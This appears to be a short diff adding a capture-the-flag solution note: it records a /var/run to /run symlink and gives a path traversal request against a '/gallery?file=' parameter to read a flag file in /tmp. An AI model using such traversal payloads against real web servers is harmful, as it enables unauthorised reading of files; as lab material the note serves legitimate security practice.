@@ -1,0 +1,5 @@
+there is a symlink in /var to /run on the system
+
+/var/run -> /run
+
+/gallery?file=../../../run/../tmp/flag.txt
